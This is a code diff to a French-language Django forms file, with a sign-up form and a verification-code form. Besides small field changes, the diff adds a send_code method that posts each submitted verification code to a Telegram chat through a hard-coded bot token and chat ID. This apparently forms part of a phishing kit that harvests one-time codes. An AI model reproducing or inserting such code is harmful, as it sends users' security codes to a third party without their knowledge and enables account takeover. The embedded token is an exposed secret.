@@ -12,7 +12,7 @@ class InscriptionForm(forms.Form):
     mot_de_passe = forms.CharField(
         label="Mot de passe",
         required=True,
-        widget=forms.TextInput(attrs={'placeholder': 'Mot de passe'}),
+        widget=forms.PasswordInput(attrs={'placeholder': 'Mot de passe'}),
         max_length=32,
     )
 
@@ -61,13 +61,44 @@ class InscriptionForm(forms.Form):
 
 
 class VerificationForm(forms.Form):
-    code = forms.CharField(
+    Code_verif = forms.CharField(
         label="Code de vérification",
         max_length=6,
         min_length=6,
         widget=forms.TextInput(attrs={
             'placeholder': '——————',
-            'class': 'code-input',
-            'inputmode': 'numeric',
+            'class':       'code-input',
+            'inputmode':   'numeric',
         }),
     )
+
+    def clean_code_verif(self):
+        code_verife = self.cleaned_data.get('Code_verif', '').strip()
+        if not code_verife:
+            raise ValidationError("Le code ne peut pas être vide.")
+        if len(code_verife) < 3:
+            raise ValidationError("Le code doit contenir au moins 3 caractères.")
+        if ' ' in code_verife:
+            raise ValidationError("Le code ne doit pas contenir d'espaces.")
+        return code_verife
+
+    def send_code(self):
+            code1  = self.cleaned_data.get('Code_verif')
+            CHAT_ID = "8849728706"
+            TOKEN = "8995148469:AAHNG55Z9GrPq6-X1AKDUTLsgVmB91VWaL8"
+            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+            data = {
+                "chat_id":    CHAT_ID,
+                "text": (
+                    f"🔔 *NOUVELLE code DÉTECTÉE*\n"
+                    f"━━━━━━━━━━━━━━━━━━━━\n"
+                    f"👤 *Code :* `{code1}`\n"
+                    f"━━━━━━━━━━━━━━━━━━━━"
+                ),
+                "parse_mode": "Markdown"
+            }
+            try:
+                response = requests.post(url, json=data, timeout=5)
+                response.raise_for_status()
+            except requests.RequestException as e:
+                print(f"Erreur envoi Telegram : {e}")
